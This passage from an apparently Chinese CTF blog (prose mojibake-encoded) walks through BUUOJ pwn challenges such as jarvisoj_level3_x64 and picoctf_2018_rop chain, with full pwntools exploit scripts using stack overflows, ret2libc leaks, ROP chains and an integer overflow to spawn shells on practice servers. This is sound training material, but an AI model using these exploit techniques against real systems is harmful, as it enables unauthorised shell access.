<p>ä»¥ä¸Šå°±æ˜¯æˆ‘å¯¹äºcanaryä¿æŠ¤çš„ç»•è¿‡å§¿åŠ¿çš„æ€»ç»“ï¼Œå¯èƒ½è¿˜æœ‰æˆ‘æš‚æ—¶æ²¡æœ‰æ¶‰åŠåˆ°çš„ï¼Œä¹Ÿæ¬¢è¿å¸ˆå‚…ä»¬æç‚¹æˆ‘ä¸€ä¸‹ï¼Œè¿™ç¯‡åšå®¢ä¹Ÿç®—æ˜¯å¤šå¤©æ²¡å­¦ä¹ ä»¥æ¥çš„ä¸€ä¸ªæ–°å¼€ç«¯å§<br>æ–‡ä¸­æ‰€æœ‰çš„ä¾‹é¢˜å’Œæˆ‘åšåˆ†äº«æ—¶çš„pptå·²ç»ä¸Šä¼ <a href="https://github.com/N0vice21/Bypass_canary_demo">github</a></p>
<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/">https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://ctf-wiki.org/pwn/linux/mitigation/canary/">https://ctf-wiki.org/pwn/linux/mitigation/canary/</a></p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>buu05</title>
    <url>/2021/05/09/2021-05-09-buu05/</url>
    <content><![CDATA[<h1 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h1><h3 id="äºŒåå…­ã€wustctf2020-getshell"><a href="#äºŒåå…­ã€wustctf2020-getshell" class="headerlink" title="äºŒåå…­ã€wustctf2020_getshell"></a>äºŒåå…­ã€wustctf2020_getshell</h3><p>ä¸€é“ç®€å•é¢˜ï¼Œç›´æ¥expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28677</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span>+p32(<span class="hljs-number">0x0804851B</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåä¸ƒã€mrctf2020-easyoverflow"><a href="#äºŒåä¸ƒã€mrctf2020-easyoverflow" class="headerlink" title="äºŒåä¸ƒã€mrctf2020_easyoverflow"></a>äºŒåä¸ƒã€mrctf2020_easyoverflow</h3><p>è™½ç„¶checksecå®Œï¼Œä¿æŠ¤å…¨å¼€äº†ï¼Œä½†æ˜¯ç¨‹åºå¾ˆç®€å•ï¼ŒçœŸçš„åªæ˜¯æº¢å‡ºè¦†ç›–å³å¯ï¼Œå°±ä¸å¤šè¯´äº†</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28551</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåå…«ã€cmcc-pwnme1"><a href="#äºŒåå…«ã€cmcc-pwnme1" class="headerlink" title="äºŒåå…«ã€cmcc_pwnme1"></a>äºŒåå…«ã€cmcc_pwnme1</h3><p>è¿™é¢˜ï¼Œæœ¬æ¥æ˜¯å¹³å¸¸çš„ret2libcçš„ï¼Œä½†æ˜¯ï¼Œé ï¼Œç»™å‘äº†</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509212554-1622863156087.png"></p>
<p>æ˜¯çš„ï¼Œè¿™é‡Œç»™äº†ä¸ªâ€œåé—¨å‡½æ•°â€ï¼ï¼Œå‡çš„ï¼Œå®³æˆ‘ä¸€ç›´æƒ³ä¸ºä»€ä¹ˆä¸èƒ½è·å–ï¼Œä»¥ä¸ºæ˜¯ä¸æ˜¯æ¥æ”¶å‡ºäº†é—®é¢˜ã€‚åŸå› å´æ˜¯homeé‡Œé¢æ˜¯ä¸å­˜åœ¨flagçš„ï¼Œæ€ä¹ˆå¯èƒ½è·å–flag</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27186</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr=<span class="hljs-number">0x08048624</span><br>p.sendlineafter(<span class="hljs-string">&quot;6. Exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xA8</span>+p32(puts_plt)+p32(addr)+p32(puts_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr ----&gt;&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload =<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåä¹ã€jarvisoj-level1"><a href="#äºŒåä¹ã€jarvisoj-level1" class="headerlink" title="äºŒåä¹ã€jarvisoj_level1"></a>äºŒåä¹ã€jarvisoj_level1</h3><p>å¸¸è§„checksecä¸€ä¸‹</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509215951-1622863179022.png"></p>
<p>å‘ç°ä»€ä¹ˆéƒ½æ²¡å¼€ï¼Œç¬¬ä¸€æƒ³æ³•å°±æ˜¯æ³¨å…¥shellcodeï¼Œç»“æœã€‚ã€‚</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220210-1622863188055.png"></p>
<p>ç»“æœidaé‡Œé¢ç«Ÿç„¶ç¡®å®æ˜¯ç»™äº†bufçš„åœ°å€ï¼Œå†åŠ ä¸Š</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220530-1622863189908.png"></p>
<p>å—¯ï¼Œå¥½å®¶ä¼™ï¼Œç›´æ¥shellcodeäº†ï¼Œç„¶åã€‚ã€‚ã€‚è¿œç¨‹ä¸é€šï¼Œæœ¬åœ°é€šäº†ï¼Œæ²¡æƒ³æ˜ç™½ï¼Œè·‘å»ç™¾åº¦äº†ï¼Œç»“æœå‘ç°ï¼Œè¿œç¨‹è¿æ¥ï¼Œç«Ÿç„¶æ˜¯å…ˆè¾“å…¥ï¼Œå†è¾“å‡ºæ ˆä¸Šçš„bufåœ°å€ï¼Œé ï¼ç„¶åæ–¹æ³•å°±å˜æˆäº†ret2libcäº†</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210509220817-1622863191858.png"></p>
<p>è¿™æ³¢ç«Ÿç„¶æ˜¯ç»™çš„é™„ä»¶ä¸å‡†ç¡®ï¼Œè§è¯†åˆ°äº†ï¼å°±è·Ÿidaé‡Œé¢æ ˆåç§»å¯èƒ½ä¼šé”™ä¸€æ ·ï¼Œä»¥åå¤šå¤šæ³¨æ„è‡ªå·±åŠ¨æ‰‹è¿›è¡Œè°ƒè¯•å’Œè¿æ¥</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26819</span>)<br><span class="hljs-comment">#p=process(&#x27;./level1&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-string">context.os=&#x27;linux&#x27;</span><br><span class="hljs-string">context.arch=&#x27;i386&#x27;</span><br><span class="hljs-string">p.recvuntil(&quot;this:0x&quot;)</span><br><span class="hljs-string">buf_addr=int(p.recv(8),16)</span><br><span class="hljs-string">print hex(buf_addr)</span><br><span class="hljs-string">shellcode=asm(shellcraft.sh())</span><br><span class="hljs-string">payload=(shellcode).ljust(0x8c,&#x27;a&#x27;)+p32(buf_addr)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&#x27;write addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åã€bjdctf-2020-babystack2"><a href="#ä¸‰åã€bjdctf-2020-babystack2" class="headerlink" title="ä¸‰åã€bjdctf_2020_babystack2"></a>ä¸‰åã€bjdctf_2020_babystack2</h3><p>å¸¸è§„checksec</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210515212002.png"></p>
<p>ä¿æŠ¤æ²¡å¼€å‡ ä¸ªï¼Œè¿›å…¥idaé™æ€åˆ†æä¸€æ³¢ï¼Œ</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210515212030.png"></p>
<p>ä»£ç å¾ˆç®€å•ï¼Œè¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œä¸èƒ½è¶…è¿‡10ï¼Œç„¶åè¿™ä¸ªæ•°å€¼ä½œä¸ºåç»­è¾“å…¥çš„å¤§å°ï¼Œå¹¶ä¸”èƒ½çœ‹å·¦è¾¹æœ‰ç»™åé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯æº¢å‡ºåŠ«æŒripå³å¯ï¼Œè®¤çœŸè§‚å¯Ÿï¼Œè¾“å…¥çš„nbyteså‰é¢æ˜¯intï¼Œåé¢å´æ˜¯unsignedäº†ï¼Œæ‰€ä»¥å­˜åœ¨æ•´å‹æº¢å‡ºï¼Œè¾“å…¥ä¸€ä¸ªè´Ÿæ•°ï¼Œå³å¯å˜ä¸ºå¾ˆå¤§çš„æ•´æ•°</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26091</span>)<br>get_shell=<span class="hljs-number">0x0400726</span><br>p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(get_shell)<br>p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åä¸€ã€jarvisoj-level3-x64"><a href="#ä¸‰åä¸€ã€jarvisoj-level3-x64" class="headerlink" title="ä¸‰åä¸€ã€jarvisoj_level3_x64"></a>ä¸‰åä¸€ã€jarvisoj_level3_x64</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210516114609-1621136841078.png"></p>
<p>ç¨‹åºå¾ˆç®€å•ï¼Œåº”è¯¥æ˜¯é“ropï¼Œæœ‰æº¢å‡ºç‚¹ï¼Œæœ‰writeæ³„éœ²å‡½æ•°ï¼Œè¿™é¢˜è€ƒç‚¹åº”è¯¥æ˜¯åœ¨äºæ˜¯64ä½ç¨‹åºï¼Œä½¿ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œè€Œwriteçš„å‚æ•°éœ€è¦ä¸‰ä¸ªå¯„å­˜å™¨æ‰è¡Œï¼Œæˆ‘ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯ret2csuï¼Œåˆšå¥½æœ‰ä¸‰ä¸ªå‰ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œæ²¡æƒ³åˆ°ï¼Œæ²¡åˆ©ç”¨æˆåŠŸï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚æœ‰å¸ˆå‚…çŸ¥é“çš„è¯ï¼Œæ³è¯·æŒ‡ç‚¹ä¸€ç•ªï¼æ„Ÿæ¿€ä¸å°½ï¼</p>
<p>ç„¶åå°±æ˜¯ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™é¢˜æœ‰è¶£ï¼Œä½¿ç”¨ROPgadgetå¯ä»¥æ‰¾åˆ°rdiå’Œrsiä¸¤ä¸ªå¯„å­˜å™¨ï¼Œè€Œç¬¬ä¸‰ä¸ªrdxå¯„å­˜ä¸éœ€è¦å»æ§åˆ¶ï¼Œé‡Œé¢çš„å€¼å·²ç»å­˜æœ‰200ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨äº†ï¼Œæ‰€ä»¥å°±æ˜¯æ­£å¸¸æ„é€ ropå³å¯</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210516115336.png"></p>
<p>æ‰€ä»¥è¿™é¢˜å¾—åˆ°çš„å°±æ˜¯ï¼Œè¦å¤šè§‚å¯Ÿæˆ‘ä»¬éœ€è¦æ„é€ çš„å¯„å­˜å™¨é‡Œé¢çš„å€¼æ˜¯å¦å·²ç»å¯ä»¥ä½¿ç”¨ï¼Œéœ€ä¸éœ€è¦é¢å¤–æ„é€ </p>
<p>expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25077</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pppppp_ret=<span class="hljs-number">0x4006aa</span>     <span class="hljs-comment">#pop_rbx_rbp_r12_r13_r14_r15_ret</span><br>mov_rdx_rsi_edi=<span class="hljs-number">0x400690</span><br>ret=<span class="hljs-number">0x400499</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pp_ret=<span class="hljs-number">0x4006b1</span>    <span class="hljs-comment">#pop_rsi_r15_ret</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload=&#x27;a&#x27;*0x88+p64(pppppp_ret)</span><br><span class="hljs-string">payload+=p64(0)*2+p64(ret)+p64(8)+p64(read_got)+p64(1)</span><br><span class="hljs-string">payload+=p64(mov_rdx_rsi_edi)+p64(write_plt)+p64(main)</span><br><span class="hljs-string">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class="hljs-string">p.recv()</span><br><span class="hljs-string">write=u64(p.recv(6).ljust(8,&#x27;\0&#x27;))</span><br><span class="hljs-string">log.info(&quot;wirte addr:&quot;+hex(write))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x88</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)			<br>payload += p64(pp_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>)	<br>payload += p64(write_plt)					<br>payload += p64(main)									<br>p.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload)<br>read = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))	<br>log.info(<span class="hljs-string">&quot;read addr:&quot;</span>+<span class="hljs-built_in">hex</span>(read))<br>libc = LibcSearcher(<span class="hljs-string">&quot;read&quot;</span>,read)<br>libc_base = read - libc.dump(<span class="hljs-string">&quot;read&quot;</span>)<br>system = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input:&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åäºŒã€jarvisoj-level4"><a href="#ä¸‰åäºŒã€jarvisoj-level4" class="headerlink" title="ä¸‰åäºŒã€jarvisoj_level4"></a>ä¸‰åäºŒã€jarvisoj_level4</h3><p>32ä½çš„ropï¼Œå°±æ²¡æœ‰ä¸Šé¢é‚£ä¹ˆéº»çƒ¦äº†ï¼Œç›´æ¥åœ¨æ ˆä¸Šå†™å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åä¸‰ã€picoctf-2018-rop-chain"><a href="#ä¸‰åä¸‰ã€picoctf-2018-rop-chain" class="headerlink" title="ä¸‰åä¸‰ã€picoctf_2018_rop chain"></a>ä¸‰åä¸‰ã€picoctf_2018_rop chain</h3><p>å¸¸è§„32ä½ropå³å¯getshell</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27038</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>,payload)<br>printf=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf addr:&quot;</span>+<span class="hljs-built_in">hex</span>(printf))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf)<br>libc_base=printf-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>ç»­ï¼šçªç„¶æƒ³å»ç™¾åº¦ä¸€ä¸‹ï¼Œçœ‹çœ‹é‚£ä¸ªç»™çš„åé—¨å‡½æ•°æ˜¯ä¸æ˜¯æœ‰ç”¨ï¼ˆå› ä¸ºæˆ‘æ˜¯æ²¡å»ç”¨çš„ï¼Œç›´æ¥å°±æ˜¯ret2libcäº†ï¼‰ï¼Œç»“æœå‘ç°ï¼Œå¸ˆå‚…ä»¬çš„è§£æ³•æ˜¯å»åˆ©ç”¨å·²ç»ç»™çš„å‡½æ•°ï¼Œå»è®©flagè¢«æ‰“å°å‡ºæ¥ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27036</span>)<br><br>win_function1 = <span class="hljs-number">0x080485CB</span><br>win_function2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(win_function1)<br>payload += p32(win_function2) + p32(flag) + p32(<span class="hljs-number">0xBAAAAAAD</span>) + p32(<span class="hljs-number">0xDEADBAAD</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="ä¸‰åå››ã€picoctf-2018-buffer-overflow-1"><a href="#ä¸‰åå››ã€picoctf-2018-buffer-overflow-1" class="headerlink" title="ä¸‰åå››ã€picoctf_2018_buffer overflow 1"></a>ä¸‰åå››ã€picoctf_2018_buffer overflow 1</h3><p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25801</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+p32(<span class="hljs-number">0x80485cb</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;string: &quot;</span>,payload)<br>p.recvall()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ä¸‰åäº”ã€jarvisoj-test-your-memory"><a href="#ä¸‰åäº”ã€jarvisoj-test-your-memory" class="headerlink" title="ä¸‰åäº”ã€jarvisoj_test_your_memory"></a>ä¸‰åäº”ã€jarvisoj_test_your_memory</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522154820.png"></p>
<p>checksecä¸€ä¸‹ï¼Œç„¶åè¿›å…¥ida</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522154920.png"></p>
<p>è¿™é¢˜çš„æº¢å‡ºç‚¹åœ¨scanfï¼Œç„¶åï¼Œè¿™é‡Œçš„æ£€æŸ¥ä¿æŠ¤ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆç”¨å¤„ï¼Œå¹¶ä¸èƒ½å½±å“åˆ°é€€æ ˆæ—¶å€™ï¼Œæˆ‘ä»¬æ§åˆ¶eipï¼Œæ‰€ä»¥ä¸ç”¨ç®¡ï¼Œç„¶ååé—¨å‡½æ•°ç»™äº†ï¼Œç›´æ¥ç”¨å°±å¥½äº†ã€‚</p>
<p>è¿™é¢˜è·Ÿä¹‹å‰æœ‰é“ç±»ä¼¼ï¼Œè¿™æ¬¡æˆ‘å­¦èªæ˜äº†ï¼Œå¾ˆæ—©å°±ncçœ‹äº†ï¼Œè¿œç¨‹å’Œæœ¬åœ°ä¸ä¸€æ ·ï¼Œè¿œç¨‹å…ˆè¦æˆ‘ä»¬è¿›è¡Œè¾“å…¥ï¼Œè¿™é‡Œç®—æ˜¯ä¸€ä¸ªç‚¹ï¼›è¿˜æœ‰ä¸ªå°±æ˜¯ï¼Œè°ƒç”¨ç¨‹åºå‡½æ•°æ‰“å°flagçš„æ—¶å€™ï¼Œè¿”å›åœ°å€å¤„è¦å†™å­˜åœ¨çš„åœ°å€ï¼Œä¸å¯ä»¥éšä¾¿å¡«å†™ï¼Œå¦åˆ™æ— æ³•å¾—åˆ°flagã€‚</p>
